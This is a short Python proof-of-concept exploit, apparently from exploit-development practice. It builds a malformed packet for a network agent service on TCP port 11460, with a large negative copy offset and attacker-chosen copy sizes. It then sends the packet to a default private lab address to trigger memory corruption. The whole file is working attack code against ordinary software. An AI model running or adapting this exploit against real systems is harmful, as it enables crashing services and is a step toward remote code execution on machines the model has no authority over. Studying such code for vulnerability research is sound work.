#!/usr/bin/env python3

import socket
import sys
import struct

# 0x00 - 0x04: Checksum DWORD (Data size, big endian).
# 0x04 - 0x34: psAgentCommand
# - 0x14: Offset for 1st copy operation
# - 0x18: Size of 1st copy operation
# - 0x1C: Offset for 2nd copy operation
# - 0x20: Size of 2nd copy operation
# - 0x24: Offset for 3rd copy operation
# - 0x28: Size of 3rd copy operation
# 0x34 - End:  psCommandBuffer

# struct PACKET {
# int32 data_size;
# int8 agent_command[0x30];
# int8 command_buffer[???]; }

payload_size = 0x64  # Total size of payload not including checksum.
agent_command_size = 0x30  # Size of the agent command portion.
command_buffer_size = payload_size - agent_command_size  # Size of the command buffer.

agent_command_buffer = b"A" * 0x10
agent_command_buffer += b"\x44\x61\x36\xf8"  # offset first copy. Large negative value.
agent_command_buffer += b"\xA7\x61\x00\x00"  # size of first copy
agent_command_buffer += b"\xA7\x61\x00\x00"  # offset for second copy
agent_command_buffer += b"\xA7\x61\x00\x00"  # size of second copy
agent_command_buffer += b"\xA7\x61\x00\x00" # offset of third copy
agent_command_buffer += b"\xA7\x61\x00\x00" # size of third copy
agent_command_buffer += b"A" * (agent_command_size - len(agent_command_buffer))

print(len(agent_command_buffer))

buf = struct.pack(">i", payload_size)
buf += agent_command_buffer
buf += bytearray([0x42]*command_buffer_size)

print(len(buf))


def main():
    if len(sys.argv) != 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()
